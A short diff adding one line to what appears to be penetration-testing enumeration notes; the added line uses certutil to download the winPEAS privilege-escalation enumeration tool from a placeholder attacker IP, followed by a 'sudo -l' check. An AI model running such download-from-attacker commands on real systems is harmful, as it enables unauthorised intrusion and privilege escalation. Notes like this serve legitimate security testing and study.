@@ -1,3 +1,5 @@
+certutil -urlcache -split -f http://<attacker-ip>/winPEASx64.exe winpeas.exe
+
 ENUMERATION AND SITUATIONAL AWARENESS
 
 sudo -l
